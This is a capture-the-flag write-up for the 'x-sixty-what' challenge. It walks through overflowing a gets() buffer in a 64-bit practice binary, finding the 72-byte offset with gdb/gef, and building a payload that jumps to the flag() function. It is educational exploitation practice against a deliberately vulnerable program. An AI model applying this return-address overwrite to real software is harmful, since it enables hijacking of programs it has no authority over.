# Writeup: x-sixty-what

## Overview

This challenge requires buffer overflowing the return address of a 64-bit program to a target function.
 
## Analysis

### Code Overview

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

The `vuln` function prompt user to input a string.

The `flag` function outputs the flag.

### Vulnerabilities

The `gets` function in `vuln` function does not check bounds, leading to a buffer overflow.

## Exploitation Strategy

- Perform buffer overflow at the `gets` function to change the return address to `flag` function.

- In a 64-bit architecture, The canonical address(valid address) range is 0x0000000000000000 to 0x00007FFFFFFFFFFF and 0xFFFF800000000000 to 0xFFFFFFFFFFFFFFFF. Any address outside this range is non-canonical. When the return address overwrite is non-canonical, the `rip` will not be overwriten.

- So we need to find the correct offset using `gef`.

- Craft a payload to overflow the return address to `flag` function address.

## Exploitation Steps

1. **Finding Offset**

- Run gdb

```terminal
$ gdb vuln
```

- Set breakpoint at the `gets` function in `vuln` function

```terminal
gef➤  disas vuln
Dump of assembler code for function vuln:
   0x00000000004012b2 <+0>:     endbr64
   0x00000000004012b6 <+4>:     push   rbp
   0x00000000004012b7 <+5>:     mov    rbp,rsp
   0x00000000004012ba <+8>:     sub    rsp,0x40
   0x00000000004012be <+12>:    lea    rax,[rbp-0x40]
   0x00000000004012c2 <+16>:    mov    rdi,rax
   0x00000000004012c5 <+19>:    mov    eax,0x0
   0x00000000004012ca <+24>:    call   0x401100 <gets@plt>
   0x00000000004012cf <+29>:    nop
   0x00000000004012d0 <+30>:    leave
   0x00000000004012d1 <+31>:    ret
End of assembler dump.
gef➤  break *0x00000000004012ca
```

- Run to the breakpoint and step to `gets` function

```terminal
gef➤  run
gef➤  ni
AAAA
```

- Run `telescope` command to inspect the stack

```terminal
gef➤  tele
0x00007fffffffdcd0│+0x0000: 0x00007f0041414141 ("AAAA"?)         ← $rax, $rsp
0x00007fffffffdcd8│+0x0008: 0x00007ffff7e3f82a  →  <puts+490> cmp eax, 0xffffffff
0x00007fffffffdce0│+0x0010: 0x0000000000000000
0x00007fffffffdce8│+0x0018: 0x0000000000000000
0x00007fffffffdcf0│+0x0020: 0x00007fffffffde58  →  0x00007fffffffe1c1  →  "/home/kali/CTF_Practice/PicoGym/BinaryExploitation[...]"                                                                                                     
0x00007fffffffdcf8│+0x0028: 0x00007fffffffdd40  →  0x0000000000000001
0x00007fffffffdd00│+0x0030: 0x0000000000000000
0x00007fffffffdd08│+0x0038: 0x00007fffffffde68  →  0x00007fffffffe206  →  "COLORFGBG=15;0"
0x00007fffffffdd10│+0x0040: 0x00007fffffffdd40  →  0x0000000000000001    ← $rbp
0x00007fffffffdd18│+0x0048: 0x0000000000401338  →  <main+102> mov eax, 0x0
```
- `<main+102> mov eax, 0x0` is the line setting return address to 0, so the return address is at `0x00007fffffffdd18`.

- The buffer starts at the address `0x00007fffffffdcd0`.

- Calculate the offset using Python

```terminal
$ python
>>> 0x00007fffffffdd18-0x00007fffffffdcd0
72
```
- The offset is 72 bytes.

- **Alternatives to get the offset**

1. Inspecting Assembly Language

```terminal
$ gdb vuln
gef➤  disas vuln
Dump of assembler code for function vuln:
   0x00000000004012b2 <+0>:     endbr64
   0x00000000004012b6 <+4>:     push   rbp
   0x00000000004012b7 <+5>:     mov    rbp,rsp
   0x00000000004012ba <+8>:     sub    rsp,0x40
   0x00000000004012be <+12>:    lea    rax,[rbp-0x40]
   0x00000000004012c2 <+16>:    mov    rdi,rax
   0x00000000004012c5 <+19>:    mov    eax,0x0
   0x00000000004012ca <+24>:    call   0x401100 <gets@plt>
   0x00000000004012cf <+29>:    nop
   0x00000000004012d0 <+30>:    leave
   0x00000000004012d1 <+31>:    ret
End of assembler dump.
```

By inspecting the code, we can know that the program allocates 0x40 (64 in decimal) bytes to the stack, including the `rbp` which is 8 bytes, so the offset is 72 bytes.

2. Using `pattern` function in GDB

```terminal
$ gdb vuln
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  run
```
- input the pattern created 

```terminal
Welcome to 64-bit. Give me a string that gets you the flag: 
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

- Check the offset of the value in `rsp` using `pattern offset`
gef➤  pattern offset jaaaaaaakaaaaaaalaaaaaaamaaa
[+] Searching for '6161616d616161616161616c616161616161616b616161616161616a'/'6a616161616161616b616161616161616c616161616161616d616161' with period=8
[+] Found at offset 72 (big-endian search)

1. Crafting payload

- Get the `flag` function address

```terminal
$ gdb vuln
gef➤  disas flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:     endbr64
   0x000000000040123a <+4>:     push   rbp
   0x000000000040123b <+5>:     mov    rbp,rsp
   0x000000000040123e <+8>:     sub    rsp,0x50
   0x0000000000401242 <+12>:    lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdba]        # 0x40200a
   0x0000000000401250 <+26>:    call   0x401130 <fopen@plt>
   0x0000000000401255 <+31>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401259 <+35>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040125e <+40>:    jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:    lea    rdx,[rip+0xdac]        # 0x402013
   0x0000000000401267 <+49>:    lea    rsi,[rip+0xdba]        # 0x402028
   0x000000000040126e <+56>:    lea    rdi,[rip+0xde8]        # 0x40205d
   0x0000000000401275 <+63>:    mov    eax,0x0
   0x000000000040127a <+68>:    call   0x4010e0 <printf@plt>
   0x000000000040127f <+73>:    mov    edi,0x0
   0x0000000000401284 <+78>:    call   0x401140 <exit@plt>
   0x0000000000401289 <+83>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040128d <+87>:    lea    rax,[rbp-0x50]
   0x0000000000401291 <+91>:    mov    esi,0x40
   0x0000000000401296 <+96>:    mov    rdi,rax
   0x0000000000401299 <+99>:    call   0x4010f0 <fgets@plt>
   0x000000000040129e <+104>:   lea    rax,[rbp-0x50]
   0x00000000004012a2 <+108>:   mov    rdi,rax
   0x00000000004012a5 <+111>:   mov    eax,0x0
   0x00000000004012aa <+116>:   call   0x4010e0 <printf@plt>
   0x00000000004012af <+121>:   nop
   0x00000000004012b0 <+122>:   leave
   0x00000000004012b1 <+123>:   ret
End of assembler dump.
```

- Craft the payload using python

```terminal
$ python 
>>> from pwn import *
>>> print ('A'*72)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>>> p64(0x0000000000401236)
b'6\x12@\x00\x00\x00\x00\x00'
$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6\x12@\x00\x00\x00\x00\x00" > payload.txt
```

3. Run the Program Locally Using Payload

```terminal
$ cat payload.txt| ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
U got the flag
```
- **Differences on Remote Machine**
For some reason, the crafted return address does not work on the remote machine provided. The challenge hint suggests changing the return address to the one after the push instruction in the flag function.

## Conclusion

In this challenge, we successfully exploited a buffer overflow vulnerability in a 64-bit program to redirect the program's execution flow to the flag function, thereby retrieving the flag. The process involved identifying the overflow vulnerability due to the use of the unsafe gets function, calculating the correct offset to overwrite the return address, and crafting a payload to change the return address to the flag function's address.

Key takeaways include:

Identifying Vulnerabilities: Understanding the dangers of functions like gets which do not check buffer boundaries.
Calculating Offsets: Utilizing tools like GDB and Python to find precise offsets for buffer overflows.
Crafting Payloads: Creating payloads that exploit vulnerabilities to achieve desired outcomes, such as redirecting execution flow.
This challenge highlights the importance of secure coding practices and the necessity of thorough vulnerability testing to prevent exploitation.
